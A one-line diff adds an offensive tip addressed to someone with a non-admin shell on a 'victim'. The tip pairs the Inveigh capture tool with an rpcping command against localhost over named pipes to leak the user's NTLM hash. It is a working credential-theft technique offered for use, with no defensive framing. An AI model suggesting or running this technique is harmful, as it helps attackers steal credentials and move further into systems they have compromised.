@@ -1,0 +1,1 @@
+Got a shell on a victim without admin? Want their creds? Try Inveigh then rpcping -s 127.0.0.1 -t ncacn_np to leak hash.
